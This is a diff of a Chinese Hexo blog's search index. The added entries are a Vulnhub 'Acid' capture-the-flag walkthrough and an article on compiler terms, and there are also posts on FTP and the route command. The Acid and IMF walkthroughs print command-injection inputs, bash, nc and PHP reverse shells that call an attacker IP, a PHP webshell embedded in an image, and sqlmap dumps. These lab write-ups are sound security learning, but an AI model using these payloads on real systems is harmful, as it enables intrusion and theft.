@@ -1,15 +1,29 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title><![CDATA[计网实验之FTP协议分析]]></title>
-    <url>%2F2019%2F03%2F20%2F%E8%AE%A1%E7%BD%91%E5%AE%9E%E9%AA%8C%E4%B9%8BFTP%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%2F</url>
-    <content type="text"><![CDATA[FTP协议介绍文件传输协议FTP(File Transfer Protocol)是TCP/IP协议组种的应用层协议之一，是因特网中使用最广泛的文件传输协议。该协议旨在提高文件的共享性，透明、可靠的和高效的传送远程用户数据。其没有针对某种具体的操作系统或文件类型而设计，通过一些规程，利用网络低层的服务，屏蔽了计算机系统的细节，所以可以在异构网中传送文件。 主要功能用于实现用户间文件分发共享，以及网络管理者在进行设备版本升级、日志下载和配置保存等业务操作时，均会使用到FTP功能。 TCP连接FTP的有两种TCP连接控制连接和数据连接。 在TCP/IP协议中，FTP协议标准命令TCP端口为21，port方式数据端口为20。 控制连接（TCP 21端口）主要用于实现FTP协议控制信令传送，服务器端打开TCP 21端口被动等待客户端发起连接命令；客户端则以主动方式打开随机端口，发起连接的建立请求。 在控制连接种使用的是ftp命令，其并不真正与FTP服务器交互，而是通过用户协议解释器翻译成真正的FTP命令，再与服务器交互。 数据连接（TCP 20端口）主要用于实现应用数据传送，服务器的数据连接端使用端口20。服务器执行主动打开数据连接，通常也执行主动关闭数据连接 。 数据连接只在传输文件时存在。 控制连接再整个会话期间一直保持连接状态数据连接则时临时建立，在文件传输结束后被关闭。 FTP客户/服务器FTP是一个客户/服务器系统。客户端和服务器端通过数据连接和控制连接进行通信。 数据连接的两种模式FTP的数据连接支持两种模式：主动模式和被动模式。两者的主要区别在于数据连接是由谁发起的。 主动模式即Port方式，FTP协议最初定义的数据传输连接方式。收到数据传送请求后，服务器主动与客户端建立连接。 FTP客户端通过向FTP服务器发送PORT命令PORT n1,n2,n3,n4,n5,n6，其中前四位表示客户端的IP地址n1,n2,n3,n4,后两位确定临时端口号为n5 × 256 + n6。当需要传送数据时，服务器通过TCP端口号20与客户端的临时端口建立数据传输通道，完成数据传输。在建立数据连接的过程中，由服务器主动发起连接，因此被称为主动方式。 被动模式即Pasv模式。 FTP客户端通过向FTP服务器发送PASV命令。服务器收到PASV命令后，随机打开一个高端端口，并告知客户端。当需要传送数据时，客户端主动与服务器的临时端口号建立数据传输通道，完成数据传输。在整个过程中，由于服务器总是被动接收客户端的数据连接，因此被称为被动方式。 两种模式优缺点主动FTP对FTP服务器的管理有利，但对客户端的管理不利。因为FTP服务器企图与客户端的高位随机端口建立连接，而这个端口很有可能被客户端的防火墙阻塞掉。 被动FTP对FTP客户端的管理有利，但对服务器端的管理不利。因为客户端要与服务器端建立两个连接，其中一个连到一个高位随机端口，而这个端口很有可能被服务器端的防火墙阻塞掉。 FTP模式的选择当FTP服务器与FTP客户端均处于同一局域网内，即两者之间互访不存在防火墙或其他安全设备时，主动方式、被动方式均可实现FTP文件分发共享。 如果FTP服务器处于路由器，防火墙或其他NAT设备之后，建议使用被动模式（passive mode）。因为在主动模式下传输数据时，由FTP发起的数据传输一般会被客户端网关的防火墙阻断。 FTP传输FTP的一个突出的问题是它以明文的方式发送用户名和口令。所以导致任何人通过对网络进行嗅探就可以捕获用户名和密码。FTP发送的数据也是明文的，通过对FTP连接的监控和数据收集就可以收集和重现FTP的数据传输并实现协议连接回放。目前可以将FTP与SSL相结合，对数据包进行加密，来保护数据不被攻击者轻易得到。]]></content>
+    <title><![CDATA[Vulnhub实战之Acid]]></title>
+    <url>%2F2019%2F03%2F25%2FVulnhub%E5%AE%9E%E6%88%98%E4%B9%8BAcid%2F</url>
+    <content type="text"><![CDATA[简介Vulnhub是一个开放的靶机平台，主旨是让任何人可以方便快捷的获得安全相关的实战经验。里面很多练习靶机镜像，可以用VMware或virtualBox打开，目标为获得靶机中的flag，提权。 网址：https://www.vulnhub.com/ 本文靶机镜像下载地址：https://download.vulnhub.com/acid/Acid.rar 目标：获得root权限和flag。 0x01 信息收集IP收集首先要确定目标主机的IP地址，运行nmap，进行网段扫描。 从结果中获得目标IP地址192.168.175.136 目标扫描找到目标地址后，针对目标进行扫描，包括端口扫描、服务识别等。 1nmap -p1-65535 -sV 192.168.175.136 对结果分析，发现目标机开启了tcp33447端口，web服务器版本为Apache 2.4.10，操作系统为Ubuntu。 综合以上，我们可以得到的信息有： tcp33447端口开放 Apache服务 Ubuntu操作系统 0x02 漏洞分析从获得的信息，我们可以从Apache和Ubuntu漏洞入手，一般我们重点看web漏洞。 web挖掘思路： (1) 查看每个网页的源码，看是否有提示； (2) 暴破目录，用御剑或DirBuster，看是否有新网页，找新网页的漏洞； Apache挖掘思路： (1) 寻找Apache2.4.10有无已知漏洞可利用：没有发现可直接利用的漏洞。 (2) 到www.exploit-db.com查询有无exp：没有找到exp。 Web漏洞分析进入目标机网页 网页很简单，没有发现二级页面，F12查看源码。 发现有注释，0x643239334c6d70775a773d3d,为16进制字符串，将其转换为字符串，得到d293LmpwZw==。 对其进行base64解密，得到wow.jpg，一张图片名，访问尝试一下。 直接访问，提示没有找到文件，可能不在同一目录，猜测目录。 http://192.168.175.136:33447/images/wow.jpg 得到图片 将图片下载至本地，先查看属性，看是否存在可用信息，未包含信息。 用notepad++将图片打开，在图片最后发现37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34,猜测为16进制字符，将其转换为字符串。 得到7aee0f6d588ed9905ee37f16a7c610d4，这是一串MD5，对其进行解密，得到63425，猜测为一个ID。 在首页时，发现其标题显示为\challenge,可能为另一网页。 访问http://192.168.175.136:33447/Challenge/ 任意输入邮箱和密码显示登陆失败。利用sqlmap，尝试注入，因为请求时POST请求，所以先用burpSuite将请求文件保存下来。 没有发现注入点。 利用dirbuster进行路径爆破。 发现在/challenge下存在新的路径，include.php、cake.php、hacked.php. 访问cake.php, 点击login，进入index.php，登录页，看网页标题为/Magic_Box。 访问hacked.php， 一个添加ID的页面。任意输入一个ID，显示添加成功。 访问include.php， 一个文件包含的页面，输入etc/passwd,发现返回了文件内容。 继续爆破/Magic_Box, 发现新路径low.php、command.php。 low.php为空白页面，command.php存在一个ping命令执行。尝试命令执行。 1127.0.0.1；whoami 发现执行成功， 利用命令执行获取shell。 攻击机开启nc监听， 尝试bash反弹shell 1bash -i &gt;&amp; /dev/tcp/192.168.175.134/4444 0&gt;&amp;1 尝试nc反弹shell 1nc -e /bin/bash -d 192.168.175.134 4444 尝试PHP反弹shell 1php -r &apos;$sock=fsockopen(&quot;192.168.175.134&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos; 成功！ 但无法执行su命令，需要终端。 回显su: must be run from a terminal 需要一个终端 用python调用本地的shell, 12echo &quot;import pty; pty.spawn(&apos;/bin/bash&apos;)&quot; &gt; /tmp/asdf.pypython /tmp/asdf.py 成功获取终端。 执行cat /etc/passwd，查看用户。 具有bash权限的用户有root、acid、saman. 找每个用户的文件（不显示错误） find / -user saman 2&gt;/dev/null find / -user acid 2&gt;/dev/null 发现一个pcapng文件，这是一个网络流量包文件。下载至本机进行分析。 在其中一个TCP包中发现用户saman的密码，1337hax0r。 利用su提权。 获取flag。]]></content>
       <categories>
-        <category>网络实验</category>
+        <category>安全笔记</category>
       </categories>
       <tags>
-        <tag>计算机网络实验</tag>
-        <tag>FTP协议</tag>
+        <tag>Vulnhub</tag>
+        <tag>Acid</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[编译器一些闲话-gcc/clang/llvm/..]]></title>
+    <url>%2F2019%2F03%2F24%2F%E7%BC%96%E8%AF%91%E5%99%A8%E4%B8%80%E4%BA%9B%E9%97%B2%E8%AF%9D-gcc%E3%80%81clang%E3%80%81llvm%2F</url>
+    <content type="text"><![CDATA[最近为C语言配置环境，由于太久没有使用，加上之前学习时也没有说深入了解，在配置时发现一些术语已经不清楚什么意思了，本文的目的主要是解释在配置环境是遇到的编译器相关的术语，gcc/clang/llvm/MinGW/MSVC等。 GNU在谈编译器之前，还要先聊下GUN。GNU，名称来自“Gnu’s Not Unix”的缩写，是一个由GNU计划推动的类Unix操作系统，目标在于创建一个完全兼容于UNIX的自由软件环境。 由于当时UNIX系统是商业软件，是收费的，而且有一部分源码是没有开放的，所以在1983年，理查德·斯托曼提出GNU计划，希望发展出一套完整的开放源代码操作系统来取代Unix，计划中的操作系统，名为GNU。因此，GNU的出现的目的就是为了取代UNIX系统。 但是操作系统是包括很多软件的，除了操作系统内核之外，还要有编辑器，编译器，shell等等一些软件来支持。 1989年，GNU项目中的其他部份，如编辑器、编译器、shell等都已经完成，独缺操作系统核心。 1990年，自由软件基金会开始正式发展Hurd，作为GNU项目中的操作系统。但是Hurd的研发并不顺利。 1991年，Linux出现，所有GNU项目中，运行于用户空间的软件，都可以在Linux上使用。许多开发者转向于Linux，Linux成为常见的GNU计划软件运行平台。理查德·斯托曼主张，Linux操作系统使用了许多GNU计划软件，应正名为GNU/Linux，但没有得到Linux社区的一致认同，形成GNU/Linux命名争议。 1992年，Linux与其他GNU软件结合，完全自由的操作系统正式诞生。 GNU工程十几年以来已经成为一个对软件开发主要的影响力量，创造了无数的重要的工具。GNU计划中的许多软件目前在所有的操作系统中都应用广泛(mac，linux，win)，最出名的就是GCC。 GCCGCC（GNU Compiler Collection，GNU编译器套装），是一套由GNU开发的编程语言编译器。 它是一套以GPL及LGPL许可证所发布的自由软件，也是GNU项目的关键部分，亦是自由的类Unix及苹果电脑Mac OS X 操作系统的标准编译器。 GCC（特别是其中的C语言编译器）也常被认为是跨平台编译器的事实标准。 GCC原名为GNU C语言编译器（GNU C Compiler），因为它原本只能处理C语言。GCC很快地扩展，变得可处理C++。之后也变得可处理Fortran、Pascal、Objective-C、Java、Ada，以及Go与其他语言。 GCC通常是跨平台软件的编译器首选。 有别于一般局限于特定系统与运行环境的编译器，GCC在所有平台上都使用同一个前端处理程序，产生一样的中介码，因此此中介码在各个其他平台上使用GCC编译，有很大的机会可得到正确无误的输出程序。 ClangClang 是一个C、C++、Objective-C和Objective-C++编程语言的编译器前端。它采用了底层虚拟机（LLVM）作为其后端。它的目标是提供一个GNU编译器套装（GCC）的替代品。 这个软件项目在2005年由Apple发起，Apple大量使用的Objective-C在GCC中优先级很低。同时GCC作为一个纯粹的编译系统，与IDE配合得很差。加之许可证方面的要求，Apple无法使用LLVM 继续改进GCC的代码质量。于是，Apple决定从零开始写 C、C++、Objective-C语言的前端 Clang，完全替代掉GCC。 Clang 是LLVM编译器工具集的前端（front-end），目的是输出代码对应的抽象语法树（Abstract Syntax Tree, AST），并将代码编译成LLVM Bitcode。接着在后端（back-end）使用LLVM编译成平台相关的机器语言 。Clang支持C、C++、Objective C。 Clang只支持C，C++和Objective-C三种C家族语言。 LLVMLLVM 是 Low Level Virtual Machine 的简称，其提供了与编译器相关的支持，能够进行程序语言的编译期优化、链接优化、在线编译优化、代码生成。 Apple（包括中后期的NeXT） 一直使用GCC作为官方的编译器。GCC作为开源世界的编译器标准一直做得不错，但Apple对编译工具会提出更高的要求。 一方面，是Apple对Objective-C语言（甚至后来对C语言）新增很多特性，但GCC开发者并不配合，之后两者分成两条分支分别开发，这造成Apple的编译器版本远落后于GCC的官方版本。另一方面，GCC的代码耦合度太高，不好独立，而且越是后期的版本，代码质量越差，但Apple想做的很多功能（比如更好的IDE支持）需要模块化的方式来调用GCC，但GCC一直不实现。另外，《GCC运行环境豁免条款 （英文版）》从根本上限制了LLVM-GCC的开发。所以Apple发起了LLVM。 MinGWMinGW是Minimalistic GNU for Windows的简称，主要方向是让GCC的Windows移植版能使用Win32API来编程。 MinGW 收集了一系列免费的Windows 使用的头文件和库文件；同时整合了GNU 的工具集，特别是GNU 程序开发工具，如经典gcc, g++, make等。MinGW是完全免费的自由软件，它在Windows平台上模拟了Linux下GCC的开发环境，为C++的跨平台开发提供了良好基础支持，为了在Windows下工作的程序员熟悉Linux下的C++工程组织提供了条件。 MinGW几乎支持所有的Win32API，其所连接的程序，不需要任何第三方库就可以运行了,允许人们在没有第三方动态链接库的情况下使用 GCC(GNU Compiler C)产生 Windows32 程序。 MSVCMSVC是指Microsoft Visual C++，即微软的VC++运行库。使用MSVC就意味着编译该软件的运行库是vc++运行库。使用了微软的运行库，大大减少了软件的编码量，却提高了兼容性。 编译流程这里仅结合上面提到的编译器做简单介绍，对详细原理，之后会做介绍，如对编译原理感兴趣推荐龙书。 上面提到Clang为编译器前端，LLVM为编译器后端，这里的前端和后端代表了编译过程中的两个阶段，以中间代码为分界，前面的词法分析、语法分析、语义分析我们把它称之为前端处理，后面的优化和目标代码生成我们称之为后端处理。 前端的主要功能是产生一个可供后端处理的语法树。面临的问题是语法树结构与处理器架构是相关联的，这正是编译器应用中需要解决的问题。]]></content>
+      <categories>
+        <category>SIX不言</category>
+      </categories>
+      <tags>
+        <tag>编译器</tag>
+        <tag>gcc</tag>
+        <tag>clang</tag>
+        <tag>llvm</tag>
       </tags>
   </entry>
   <entry>
@@ -26,6 +40,18 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[计网实验之FTP协议分析]]></title>
+    <url>%2F2019%2F03%2F20%2F%E8%AE%A1%E7%BD%91%E5%AE%9E%E9%AA%8C%E4%B9%8BFTP%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%2F</url>
+    <content type="text"><![CDATA[FTP协议介绍文件传输协议FTP(File Transfer Protocol)是TCP/IP协议组种的应用层协议之一，是因特网中使用最广泛的文件传输协议。该协议旨在提高文件的共享性，透明、可靠的和高效的传送远程用户数据。其没有针对某种具体的操作系统或文件类型而设计，通过一些规程，利用网络低层的服务，屏蔽了计算机系统的细节，所以可以在异构网中传送文件。 主要功能用于实现用户间文件分发共享，以及网络管理者在进行设备版本升级、日志下载和配置保存等业务操作时，均会使用到FTP功能。 TCP连接FTP的有两种TCP连接控制连接和数据连接。 在TCP/IP协议中，FTP协议标准命令TCP端口为21，port方式数据端口为20。 控制连接（TCP 21端口）主要用于实现FTP协议控制信令传送，服务器端打开TCP 21端口被动等待客户端发起连接命令；客户端则以主动方式打开随机端口，发起连接的建立请求。 在控制连接种使用的是ftp命令，其并不真正与FTP服务器交互，而是通过用户协议解释器翻译成真正的FTP命令，再与服务器交互。 数据连接（TCP 20端口）主要用于实现应用数据传送，服务器的数据连接端使用端口20。服务器执行主动打开数据连接，通常也执行主动关闭数据连接 。 数据连接只在传输文件时存在。 控制连接再整个会话期间一直保持连接状态数据连接则时临时建立，在文件传输结束后被关闭。 FTP客户/服务器FTP是一个客户/服务器系统。客户端和服务器端通过数据连接和控制连接进行通信。 数据连接的两种模式FTP的数据连接支持两种模式：主动模式和被动模式。两者的主要区别在于数据连接是由谁发起的。 主动模式即Port方式，FTP协议最初定义的数据传输连接方式。收到数据传送请求后，服务器主动与客户端建立连接。 FTP客户端通过向FTP服务器发送PORT命令PORT n1,n2,n3,n4,n5,n6，其中前四位表示客户端的IP地址n1,n2,n3,n4,后两位确定临时端口号为n5 × 256 + n6。当需要传送数据时，服务器通过TCP端口号20与客户端的临时端口建立数据传输通道，完成数据传输。在建立数据连接的过程中，由服务器主动发起连接，因此被称为主动方式。 被动模式即Pasv模式。 FTP客户端通过向FTP服务器发送PASV命令。服务器收到PASV命令后，随机打开一个高端端口，并告知客户端。当需要传送数据时，客户端主动与服务器的临时端口号建立数据传输通道，完成数据传输。在整个过程中，由于服务器总是被动接收客户端的数据连接，因此被称为被动方式。 两种模式优缺点主动FTP对FTP服务器的管理有利，但对客户端的管理不利。因为FTP服务器企图与客户端的高位随机端口建立连接，而这个端口很有可能被客户端的防火墙阻塞掉。 被动FTP对FTP客户端的管理有利，但对服务器端的管理不利。因为客户端要与服务器端建立两个连接，其中一个连到一个高位随机端口，而这个端口很有可能被服务器端的防火墙阻塞掉。 FTP模式的选择当FTP服务器与FTP客户端均处于同一局域网内，即两者之间互访不存在防火墙或其他安全设备时，主动方式、被动方式均可实现FTP文件分发共享。 如果FTP服务器处于路由器，防火墙或其他NAT设备之后，建议使用被动模式（passive mode）。因为在主动模式下传输数据时，由FTP发起的数据传输一般会被客户端网关的防火墙阻断。 FTP传输FTP的一个突出的问题是它以明文的方式发送用户名和口令。所以导致任何人通过对网络进行嗅探就可以捕获用户名和密码。FTP发送的数据也是明文的，通过对FTP连接的监控和数据收集就可以收集和重现FTP的数据传输并实现协议连接回放。目前可以将FTP与SSL相结合，对数据包进行加密，来保护数据不被攻击者轻易得到。]]></content>
+      <categories>
+        <category>网络实验</category>
+      </categories>
+      <tags>
+        <tag>计算机网络实验</tag>
+        <tag>FTP协议</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Vulnhub实战之IMF]]></title>
     <url>%2F2019%2F03%2F03%2FVulnhub%E5%AE%9E%E6%88%98%E4%B9%8BIMF%2F</url>
     <content type="text"><![CDATA[简介Vulnhub是一个开放的靶机平台，主旨是让任何人可以方便快捷的获得安全相关的实战经验。里面很多练习靶机镜像，可以用VMware或virtualBox打开，目标为获得靶机中的flag，提权。 网址：https://www.vulnhub.com/ 本文靶机镜像下载地址： https://download.vulnhub.com/imf/IMF.ova IMF是一个初级难度的boot 2 root（查看flag，获得root权限）靶机，每个flag都包含获取下一个flag的提示。 作者邮箱：geckom@redteamr.com 实战信息收集首先使用VMware运行获得的靶机镜像，进入系统发现需要输入密码。 运行另一台攻击机，我选用的是Kali。使用nmap扫描网段端口，发现主机IP命令。 获得目标主机IP地址：192.168.175.135 对目标IP做进一步的扫描： 发现80端口上运行着Apache，利用IP地址直接访问网页。 渗透分析 进入网站，网站有三个选项卡，查看源码，寻找线索。 在第三个页面的源码处发现第一个flag。 将第一个flag进行base64解密，得到flag2的提示allthefiles。 根据提示，在源码中发现引用的JS文件名 将文件名拼起来，解码，得到flag2：flag2{aW1mYWRtaW5pc3RyYXRvcg==} 再次base64解码后得到提示：imfadministrator 进入192.168.175.135/imfadministrator/，出现一个登录页。任意输入用户名，返回无效的用户名。在之前的网页上查找信息，在contact us页面上有三个人，进行尝试，发现输入第一个人名，返回信息变成了无效密码，说明用户名正确。 同时阅读源码发现，密码并没有存储在数据库中，而是硬编码在文件中。 猜测是使用strcmp之类的密码进行判断密码。当strcmp的两个字符串参数相等时会返回0，但如果把string和array进行比较，同样也会返回0. 所以，这里将源码中的 123&lt;input name="pass" value="" type="password"&gt;改为&lt;input name="pass[]" value="" type="password"&gt; 这样就可以使得pass参数变成了一个array。 获得flag3：flag{Y29udGludWVUT2Ntcw==} base64解码后，获得：continueTOcms。 进入CMS浏览网页，发现url中存在参数pagename，可能存在注入点，复制cookie信息，使用sqlmap进行注入测试： 1sqlmap -u http://192.168.190.128/imfadministrator/cms.php?pagename=upload --cookie "PHPSESSID=9q75n4adk0os5lultm4a5934t2" --dump dump在数据库中发现共有四项，后两项包含两张图片，访问后，发现第三项中的图片含有一个二维码，扫描后获得flag4：flag4{dXBsb2Fkcjk0Mi5waHA=}。解码后获得：uploadr942.php 根据提示，进入一个文件上传页面，应该存在文件上传漏洞。 经过测试，只能上传图片（jpg,png,gif）,存在WAF和文件头过滤。上传成功后在注释中会出现上传后的文件名。 尝试将PHP代码加入图片中。 1&lt;?php $s=$_GET['s']; echo `$s`; ?&gt; 在win 上，使用命令： 1copy 1.png/b+2.php 3.png 图片上传成功，需要寻找存储的路径，利用工具dirb： 1dirb http://192.168.175.135/imfadministrator 发现存在uploads文件夹。 访问：http://192.168.175.135/imfadministrator/uploads/ebfcb10328e2.gif？s = ls 返回结果中，发现文件flag5_abc123def.txt，使用s = cat flag5_abc123def.txt,获得flag5{YWdlbnRzZXJ2aWNlcw==}，解码后得到agentservices。 根据提示，入口点应该在一个名叫agent的服务上。 未完待续 总结 源文件包含flag 分析源码，如本文中的flag3 WAF绕过]]></content>
@@ -35,19 +61,6 @@
       <tags>
         <tag>Vulnhub</tag>
         <tag>IMF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[计网实验基础之网络命令-route]]></title>
-    <url>%2F2019%2F01%2F26%2F%E8%AE%A1%E7%BD%91%E5%AE%9E%E9%AA%8C%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4-route%2F</url>
-    <content type="text"><![CDATA[route命令 Route命令用于在本地IP路由表中显示和修改条目。在排除网络故障时常会用到。 win 与linux下相同，用法有细微差别。 Route命令是用于操作基于内核ip路由表，它的主要作用是创建一个静态路由让指定一个主机或者一个网络通过一个网络接口，如eth0。 123# 命令格式route [-f] [-p] [Command [Destination] [mask Netmask] [Gateway] [metric Metric]] [if Interface]] # 具体格式请按照使用的机器的提示进行，不同机器或许不同 123456789101112131415161718192021# 命令参数-c 显示更多信息-n 不解析名字-v 显示详细的处理信息-F 显示发送信息-C 显示路由缓存-f 清除所有网关入口的路由表。 -p 与 add 命令一起使用时使路由具有永久性。add:添加一条新路由。del:删除一条路由。-net:目标地址是一个网络。-host:目标地址是一个主机。netmask:当添加一个网络路由时，需要使用网络掩码。gw:路由数据包通过网关。注意，你指定的网关必须能够达到。metric：设置路由跳数。Command 指定您想运行的命令 (Add/Change/Delete/Print)。 Destination 指定该路由的网络目标。 mask Netmask 指定与网络目标相关的网络掩码（也被称作子网掩码）。 Gateway 指定网络目标定义的地址集和子网掩码可以到达的前进或下一跃点 IP 地址。 metric Metric 为路由指定一个整数成本值标（从 1 至 9999），当在路由表(与转发的数据包目标地址最匹配)的多个路由中进行选择时可以使用。 if Interface 为可以访问目标的接口指定接口索引。若要获得一个接口列表和它们相应的接口索引，使用 route print 命令的显示功能。可以使用十进制或十六进制值进行接口索引。 使用详解 显示当前路由 123route print # winroute print 157* # win 打印匹配的项route # ubuntu 上面是win和linux下显示的不同的路由表。 Flags标志说明： U Up表示此路由当前为启动状态 H Host，表示此网关为一主机 G Gateway，表示此网关为一路由器 R Reinstate Route，使用动态路由重新初始化的路由 D Dynamically,此路由是动态性地写入 M Modified，此路由是由路由守护程序或导向器动态修改 ! 表示此路由当前为关闭状态 添加网关/设置网关 12345route ADD 3ffe::/32 3ffe::1route ADD 157.0.0.0 MASK 255.0.0.0 157.55.80.1 METRIC 3 IF 2 destination^ ^mask ^gateway metric^ ^ Interface # 如果未给出 IF，它将尝试查找给定网关的最佳接口。 修改网关 12route CHANGE 157.0.0.0 MASK 255.0.0.0 157.55.80.5 METRIC 2 IF 2 # CHANGE 只用于修改网关和/或跃点数。 屏蔽路由 1route add -net 224.0.0.0 netmask 240.0.0.0 reject 增加一条屏蔽的路由，目的地址为 224.x.x.x 将被拒绝 删除路由记录 12route DELETE 157.0.0.0route del -net 224.0.0.0 netmask 240.0.0.0 # linux 清除路由表 1route -f 添加永久性路由 1route add addr -p]]></content>
-      <categories>
-        <category>网络实验</category>
-      </categories>
-      <tags>
-        <tag>计算机网络实验</tag>
-        <tag>网络命令</tag>
-        <tag>route</tag>
       </tags>
   </entry>
   <entry>
@@ -63,6 +76,19 @@
         <tag>ipconfig</tag>
         <tag>ifconfig</tag>
         <tag>netstat</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[计网实验基础之网络命令-route]]></title>
+    <url>%2F2019%2F01%2F26%2F%E8%AE%A1%E7%BD%91%E5%AE%9E%E9%AA%8C%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4-route%2F</url>
+    <content type="text"><![CDATA[route命令 Route命令用于在本地IP路由表中显示和修改条目。在排除网络故障时常会用到。 win 与linux下相同，用法有细微差别。 Route命令是用于操作基于内核ip路由表，它的主要作用是创建一个静态路由让指定一个主机或者一个网络通过一个网络接口，如eth0。 123# 命令格式route [-f] [-p] [Command [Destination] [mask Netmask] [Gateway] [metric Metric]] [if Interface]] # 具体格式请按照使用的机器的提示进行，不同机器或许不同 123456789101112131415161718192021# 命令参数-c 显示更多信息-n 不解析名字-v 显示详细的处理信息-F 显示发送信息-C 显示路由缓存-f 清除所有网关入口的路由表。 -p 与 add 命令一起使用时使路由具有永久性。add:添加一条新路由。del:删除一条路由。-net:目标地址是一个网络。-host:目标地址是一个主机。netmask:当添加一个网络路由时，需要使用网络掩码。gw:路由数据包通过网关。注意，你指定的网关必须能够达到。metric：设置路由跳数。Command 指定您想运行的命令 (Add/Change/Delete/Print)。 Destination 指定该路由的网络目标。 mask Netmask 指定与网络目标相关的网络掩码（也被称作子网掩码）。 Gateway 指定网络目标定义的地址集和子网掩码可以到达的前进或下一跃点 IP 地址。 metric Metric 为路由指定一个整数成本值标（从 1 至 9999），当在路由表(与转发的数据包目标地址最匹配)的多个路由中进行选择时可以使用。 if Interface 为可以访问目标的接口指定接口索引。若要获得一个接口列表和它们相应的接口索引，使用 route print 命令的显示功能。可以使用十进制或十六进制值进行接口索引。 使用详解 显示当前路由 123route print # winroute print 157* # win 打印匹配的项route # ubuntu 上面是win和linux下显示的不同的路由表。 Flags标志说明： U Up表示此路由当前为启动状态 H Host，表示此网关为一主机 G Gateway，表示此网关为一路由器 R Reinstate Route，使用动态路由重新初始化的路由 D Dynamically,此路由是动态性地写入 M Modified，此路由是由路由守护程序或导向器动态修改 ! 表示此路由当前为关闭状态 添加网关/设置网关 12345route ADD 3ffe::/32 3ffe::1route ADD 157.0.0.0 MASK 255.0.0.0 157.55.80.1 METRIC 3 IF 2 destination^ ^mask ^gateway metric^ ^ Interface # 如果未给出 IF，它将尝试查找给定网关的最佳接口。 修改网关 12route CHANGE 157.0.0.0 MASK 255.0.0.0 157.55.80.5 METRIC 2 IF 2 # CHANGE 只用于修改网关和/或跃点数。 屏蔽路由 1route add -net 224.0.0.0 netmask 240.0.0.0 reject 增加一条屏蔽的路由，目的地址为 224.x.x.x 将被拒绝 删除路由记录 12route DELETE 157.0.0.0route del -net 224.0.0.0 netmask 240.0.0.0 # linux 清除路由表 1route -f 添加永久性路由 1route add addr -p]]></content>
+      <categories>
+        <category>网络实验</category>
+      </categories>
+      <tags>
+        <tag>计算机网络实验</tag>
+        <tag>网络命令</tag>
+        <tag>route</tag>
       </tags>
   </entry>
   <entry>
@@ -126,22 +152,9 @@
         <category>论文选读</category>
       </categories>
       <tags>
-        <tag>SDN</tag>
         <tag>安全</tag>
         <tag>论文笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[SDN安全论文选读（一）]]></title>
-    <url>%2F2018%2F12%2F23%2FSDN%E5%AE%89%E5%85%A8%E8%AE%BA%E6%96%87%E9%80%89%E8%AF%BB%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
-    <content type="text"><![CDATA[Security of Software Defined Networks: Taxonomic Modeling, Key Components and Open research area来源Kaur R, Singh A, Singh S, et al. Security of software defined networks: Taxonomic modeling, key components and open research area[C]//Electrical, Electronics, and Optimization Techniques (ICEEOT), International Conference on. IEEE, 2016: 2832-2839. 为了做关于SDN安全的报告而读的一篇论文，可能看的并不仔细。 软件定义网络软件定义网络承诺网络运营商大大简化网络管理，其通过网络可编程性提供灵活性和创新。 借助SDN，网络管理从低级设备配置的编码功能转变为构建便于网络管理和调试的软件，为解决存在已久的问题提供了一种新的方法。 但是，SDN的发展也带来了新的挑战。 各种架构组件的引入和SDN新颖实体的上升循环带来了新的安全问题和威胁。 SDN被认为是数字威胁和网络攻击的主要目标，并且比简单网络具有更具破坏性的影响。 SDN的架构引发了新的外部和内部威胁和漏洞。 完整性和安全性没有被证明，更容易被通过单点攻击整个网络 可编程性为攻击者提供了执行恶意代码的能力 南向接口可能存在拒绝服务攻击和侧信道攻击 配置错误可能带来更大的危害。 SDN的代理可能被注入错误的流信息。 可能漏洞 认证攻击 数据泄露 恶意注入攻击 控制器劫持或欺骗规则注入 拒绝服务攻击 控制器-交换器通信洪泛 交换器流表洪泛 配置错误 安全解决方案分类 Secure Composition FRESCO [6] - 主要解决安全可编程问题，对于除了数据层其他层都有很大的影响，它旨在解决可加速设计新的SDN安全服务的各种关键问题。它还导出一个脚本API，使安全专家能够将安全监控和威胁检测逻辑编码为模块化库。 FORTNOX [2] - 新的安全策略实施内核。它处理授权和规则冲突，并对接口和控制层产生直接影响。 Security Audit VERIFICARE - 给出满足设计要求的模型。该提议作为验证网络正确性和规范建模的验证平台。 SDN DEBUGGER - SDN调试器帮助研究人员找出bug的根本原因。它捕获并重建导致错误行为的事件序列。调试器可帮助研究人员解决逻辑错误，并帮助网络运营商收集错误报告，然后将其提交给供应商。 Security enforcement policy VERIFLOW - Veriflow [6]基本上实时验证了网络范围内的不变量。 它是SDN控制器和网络设备之间的一个层，可以在插入修改和删除的每个转发规则时动态检查实时不变量违规。 FLOVER - Son.et al提出的Flover [6]基本上是一种检查模型，用于根据网络安全策略确定和验证流策略。它有助于设计复杂的威胁检测和缓解模块。 Perm OF - 一个细粒度的权限系统，包含各种特定于OF的权限。 Security Enhancement FleXam - FleXam是OpenFlow的采样扩展，允许Controller定义应该采样的数据包，应该选择每个数据包的哪些部分以及应该将它们发送到何处。FleXam使控制器能够动态调整采样率，从而降低控制平面负载。 CLOUDWATCHER - 一种监控云的新安全监控服务模型。CLOUDWATCHER [7]改变了网络流量的路由路径，它使流量通过安全设备所在的网络节点进行传输。 L-IDS - 学习入侵检测系统（IDS）。L-IDS是移动设备的安全服务，用于在特定区域或位置进行保护。 Security Analysis OpenWatch - 它是一个程序，可以将不同的异常检测应用程序作为输入，并决定应监视哪些流程 AVANT-GUARD - 包含两种技术，第一种技术是连接迁移，它显着减少了由于南向接口上的DOS攻击而产生的数据到控制平面的交互。另一种技术是通过在SDN设备中提供条件触发推送功能来解决响应性挑战的致动触发器。 HEADER SPACE ANALYSIS 